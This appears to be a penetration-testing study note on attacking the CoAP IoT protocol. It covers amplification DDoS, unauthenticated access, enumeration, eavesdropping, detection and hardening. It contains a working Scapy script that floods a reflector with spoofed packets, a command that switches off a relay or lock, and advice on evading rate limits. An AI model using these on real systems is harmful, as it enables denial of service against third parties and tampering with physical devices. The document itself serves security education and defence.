---
tags: [coap, iot, udp, amplification, reflection]
difficulty: intermediate
module: "35 - Network Protocol Attacks"
topic: "35.33 CoAP"
---

# CoAP — IoT Protocol Attacks

## 1. Executive Summary
The Constrained Application Protocol (CoAP) is a specialized web transfer protocol designed for use with constrained nodes and constrained networks (e.g., low-power, lossy networks). It is heavily utilized in the Internet of Things (IoT), smart city infrastructure, and industrial telemetry. CoAP is essentially "HTTP for microcontrollers." It translates seamlessly to HTTP for integration with the wider web while maintaining very low overhead through binary headers and UDP transport.

Because CoAP primarily operates over unencrypted **UDP port 5683**, it inherits all the traditional weaknesses of UDP—most notably, the lack of connection state and susceptibility to IP address spoofing. This makes CoAP a highly attractive vector for Distributed Denial of Service (DDoS) reflection and amplification attacks. Additionally, many IoT deployments fail to implement authentication, allowing attackers to directly query CoAP endpoints to read sensitive telemetry or issue malicious control commands.

## 2. Technical Architecture: CoAP Protocol
CoAP uses a request/response model identical to HTTP, employing methods like `GET`, `POST`, `PUT`, and `DELETE`. 
- **Transport:** UDP is the primary transport layer. TCP can be used but defeats the protocol's low-overhead design.
- **Ports:** 
  - UDP `5683`: Unencrypted CoAP.
  - UDP `5684`: CoAP over DTLS (Datagram Transport Layer Security).
- **Resource Discovery:** CoAP devices standardly expose a `/.well-known/core` URI. A `GET` request to this URI returns a list of all available resources (endpoints) on the device, functioning as a built-in site map.
- **Multicast:** CoAP heavily leverages IP multicast (e.g., `224.0.1.187` for IPv4) to allow a single request to query or command multiple devices simultaneously.

## 3. ASCII Architecture Diagram: CoAP Reflection/Amplification

```text
+-------------------+                                   +-------------------+
|     Attacker      |      Spoofed CoAP GET Request     |    CoAP Device    |
|   IP: 1.1.1.1     | --------------------------------> |    (Reflector)    |
+-------------------+      Src IP: 2.2.2.2 (Victim)     |    IP: 3.3.3.3    |
                           Req: GET /.well-known/core   +-------------------+
                           Payload Size: ~40 Bytes               |
                                                                 |
                                                                 |
+-------------------+                                            |
|      Victim       | <==========================================+
|   IP: 2.2.2.2     |      Massive CoAP Response
+-------------------+      (Lists all device capabilities)
                           Payload Size: ~1500 Bytes
                           Amplification Factor: ~30x to 50x
```

## 4. Attack Vectors and Misconfigurations
### 4.1 Reflection and Amplification DDoS
Because UDP does not perform a 3-way handshake, the CoAP server blindly sends its response to the IP address listed in the source field of the incoming packet. An attacker sends a tiny request (`GET /.well-known/core`) with a forged source IP (the victim's IP). The CoAP server responds with a massive payload to the victim. When coordinated across thousands of exposed CoAP devices (botnets), this results in a catastrophic volumetric DDoS attack against the victim.

### 4.2 Unauthenticated Resource Access
Like many embedded protocols, CoAP devices frequently lack authentication mechanisms. An attacker who can reach the device over the network can interact with it exactly like an open web API. They can read sensor data (`GET /temperature`) or alter physical states (`PUT /relay/1 state=off`).

### 4.3 Multicast Exploitation
If an attacker compromises a host on a local IoT network, they can send a single CoAP request to the multicast address. Every CoAP device on the subnet will process the request. This can be used to instantly map the entire IoT environment or to trigger synchronized denial of service across all smart devices simultaneously.

## 5. Enumeration Methodology
### 5.1 Nmap Scanning
Nmap has robust support for CoAP enumeration using UDP scanning and specific NSE scripts to interact with the protocol.
```bash
# Scan for CoAP on the default UDP port
nmap -sU -p 5683 -sV <target-ip>

# Discover CoAP resources using the well-known URI
nmap -sU -p 5683 --script coap-resources <target-ip>
```
**Example Nmap Output:**
```text
PORT     STATE SERVICE VERSION
5683/udp open  coap    CoAP
| coap-resources: 
|   title: IoT Smart Hub
|   resources: 
|     /.well-known/core
|     /sensors/temp
|     /sensors/humidity
|_    /admin/firmware
```

### 5.2 Interacting with CoAP Clients
Tools like `coap-client` (from the `libcoap` package) allow direct interaction with the protocol, similar to how `curl` is used for HTTP.
```bash
# Perform resource discovery manually
coap-client -m get coap://10.10.10.50/.well-known/core

# Retrieve a specific telemetry reading
coap-client -m get coap://10.10.10.50/sensors/temp
```

## 6. Exploitation Techniques
### 6.1 Eavesdropping and Cleartext Parsing
If the target network uses CoAP over UDP 5683 (instead of DTLS), all traffic is transmitted in cleartext. Attackers on the local network (or performing ARP spoofing) can use Wireshark to capture the packets. Filtering by `coap` reveals the exact URIs being accessed and the data payloads (often formatted in JSON or plain text), potentially exposing API keys or administrative tokens passed in the payload.

### 6.2 Executing the Amplification Attack (Scapy)
To execute an amplification attack, an attacker needs a tool capable of raw socket manipulation to spoof the UDP source IP. Python with the Scapy library is commonly used for this.
```python
# Simplified Scapy script for CoAP Reflection
from scapy.all import *

victim_ip = "2.2.2.2"
coap_reflector = "3.3.3.3"

# Craft spoofed IP header
ip = IP(src=victim_ip, dst=coap_reflector)

# Craft UDP header targeting CoAP port
udp = UDP(sport=RandShort(), dport=5683)

# Craft CoAP Payload: GET /.well-known/core
# CoAP Ver 1, Type: Confirmable, Code: GET (0.01)
coap_payload = b"\x40\x01\x12\x34\xbb\x2e\x77\x65\x6c\x6c\x2d\x6b\x6e\x6f\x77\x6e\x04\x63\x6f\x72\x65"

packet = ip/udp/coap_payload

# Send a continuous stream of spoofed requests
send(packet, loop=1, inter=0.01)
```

### 6.3 Modifying Physical State
If an actionable endpoint is found, an attacker can forge a `PUT` or `POST` request to alter the device's state.
```bash
# Turn off an industrial relay or smart lock
coap-client -m put -e "state=off" coap://10.10.10.50/actuators/relay1
```

## 7. Post-Exploitation
In CoAP attacks, post-exploitation usually involves analyzing the returned data to map the physical environment or pivoting to the backend systems that aggregate the CoAP data. If a device has firmware update endpoints exposed via CoAP (`/admin/firmware`), an attacker might attempt to push malicious firmware to permanently backdoor the IoT device.

## 8. Defensive Evasion
Attackers utilizing CoAP for reflection attacks rely on the fact that UDP spoofing is not universally blocked. To evade detection at the reflector side, attackers will randomize the source ports and slowly rotate through a massive list of reflector IPs to avoid triggering volumetric rate-limiting thresholds on any single device.

## 9. Incident Response & Detection
### 9.1 Network Traffic Analysis
- **Volumetric UDP Alerts:** SIEM and Network Traffic Analysis (NTA) tools should alert on high volumes of outbound UDP 5683 traffic, which strongly indicates an internal device is being used as an amplification reflector.
- **Wireshark Filter:** `coap` or `udp.port == 5683`. Look for identical, repeated `GET /.well-known/core` requests arriving from unusual external IPs.

## 10. Remediation & Hardening Guide
- **Block Public Exposure:** CoAP devices should absolutely never be exposed directly to the public internet. Use strict perimeter firewalls to block inbound UDP 5683/5684.
- **Implement DTLS (UDP 5684):** Transition from unencrypted CoAP to CoAP over DTLS. DTLS requires a full cryptographic handshake before application data is processed. This completely neutralizes IP spoofing and amplification attacks, while providing confidentiality and integrity.
- **Rate Limiting:** Implement strict rate limiting on the CoAP server for `GET` requests to `/.well-known/core` to mitigate its usefulness as an amplification reflector.
- **Authentication:** Utilize CoAP security modes (Pre-Shared Key, Raw Public Key, or X.509 Certificates) to ensure only authorized clients can access or modify resources.
- **Disable Multicast:** If multicast discovery is not strictly required by the application architecture, disable it to prevent network-wide enumeration.

## 11. Chaining Opportunities
- **[[32 - MQTT — Unauthenticated Broker]]:** IoT environments often use both CoAP and MQTT; pivot between them for complete control.
- **[[66 - Network Denial of Service (DoS)]]:** Leverage CoAP amplification as part of a broader, multi-vector DDoS campaign.
- **[[65 - IoT Firmware Analysis]]:** Analyze firmware downloaded via CoAP endpoints to extract hardcoded credentials.

## 12. Related Notes
- [[18 - UDP Scanning and Protocols]]
- [[34 - SIP VoIP — Enumeration, Eavesdropping, Toll Fraud]]
- [[35 - SCADA and ICS Security]]
